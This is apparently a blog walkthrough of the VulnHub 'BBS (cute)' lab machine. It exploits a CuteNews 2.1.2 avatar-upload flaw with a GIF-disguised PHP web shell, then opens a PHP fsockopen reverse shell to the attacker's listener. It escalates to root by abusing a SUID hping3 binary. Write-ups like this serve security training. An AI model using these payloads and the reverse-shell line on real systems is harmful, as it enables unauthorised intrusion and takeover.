---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/bbs-cute-102,567/)

# discovery
## portscan
Starting with a simple port scan to identify the attack surface.
```bash
$ nmap -Pn 192.168.55.128
```
- 22 (OpenSSH)
- 80 (Apache)
- 88 (Nginx)
- 110 (pop3)
- 995 (pop3)

## web application
Use some kind of dir busting tool like `gobuster` or `dirb` to identify the `index.php`  
> cutenews 2.1.2 is installed on the target.
{: .prompt-info }

---

# exploitation

Using searchsploit to check for available exploits.

```bash
searchsploit cutenews 2.1.2
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                                                                              | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                                                                                  | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                                                                                      | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                                                                                    | php/webapps/48800.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> cutenews 2.1.2 is vulnerable to an [rce](https://www.exploit-db.com/exploits/48800) via file upload.
{: .prompt-tip }

1. register a new account
2. perform an avatar upload to upload a shell

```http
POST /index.php HTTP/1.1
Host: 192.168.55.128
Content-Length: 1199
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.55.128
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPcKAGDM5KHHUBCDz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.55.128/index.php?mod=main&opt=personal
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
Connection: close

------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="mod"

main
------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="opt"

personal
------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="__signature_key"

61617a044cb8af8982f290744a00cd7a-hacker
------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="__signature_dsi"

db5cf5e82f5e647c292b0a2587709c4f
------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="editpassword"


------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="confirmpassword"


------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="editnickname"

hacker
------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="avatar_file"; filename="shell.php"
Content-Type: image/gif

GIF8;\n<?php system($_REQUEST['cmd']); ?>

------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="more[site]"


------WebKitFormBoundaryPcKAGDM5KHHUBCDz
Content-Disposition: form-data; name="more[about]"


------WebKitFormBoundaryPcKAGDM5KHHUBCDz--

```

The Server responds with a `200` message, which might be a good indication that everything worked as expected.

```http
HTTP/1.1 200 OK
Date: Thu, 20 Jan 2022 20:47:07 GMT
Server: Apache/2.4.38 (Debian)
Expires: Sat, 26 Jul 1997 05:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: sameorigin
Last-Modified: Thu, 20 Jan 2022 20:47:07 GMT
Cache-Control: post-check=0, pre-check=0
Accept-Charset: UTF-8
Vary: Accept-Encoding
Content-Length: 7553
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
...
```

Test command execution.

```http
GET /uploads/avatar_hacker_shell.php?cmd=whoami HTTP/1.1
Host: 192.168.55.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Thu, 20 Jan 2022 20:52:09 GMT
Server: Apache/2.4.38 (Debian)
Content-Length: 16
Connection: close
Content-Type: text/html; charset=UTF-8

GIF8;\nwww-data
```

It worked!

---

# post exploitation
## get a reverse shell
We are using a simple `PHP` based reverse shell here.  
payload: ```php -r '$sock=fsockopen("192.168.49.89",443);exec("/bin/sh -i <&3 >&3 2>&3");'```

### start listener on the attacking machine
```bash
$ nc -lvp 443
listening on [any] 443 ...
```

### trigger reverse shell
```http
GET /uploads/avatar_hacker_shell.php?cmd=php+-r+'$sock%3dfsockopen("192.168.49.55",443)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: 192.168.55.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: CUTENEWS_SESSION=qujdjltcojbtb3glgfsc3guqum
Connection: close
````

### catch connect from target
```bash
$ nc -lvp 443
listening on [any] 443 ...
192.168.55.128: inverse host lookup failed: Unknown host
connect to [192.168.49.55] from (UNKNOWN) [192.168.55.128] 36152
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## get first flag
```bash
$ pwd
/var/www
$ cat local.txt
1*******************************c
```

## privilege escalation
Looking for SUID binaries.
```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
...
-rwsr-sr-x 1 root root 156808 Sep  6  2014 /usr/sbin/hping3
...
```
Looking on [gtfobins](https://gtfobins.github.io/) on how to exploit `hping3` to get root access

```
$ /usr/sbin/hping3
hping3> /bin/sh -p
# whoami
root
```

We got root!

## get second flag
```bash
# cd /root
# ls
proof.txt  root.txt
# cat root.txt
Your flag is in another file...
# cat proof.txt
a*****************************b
```
  
Pwned! <@:-)
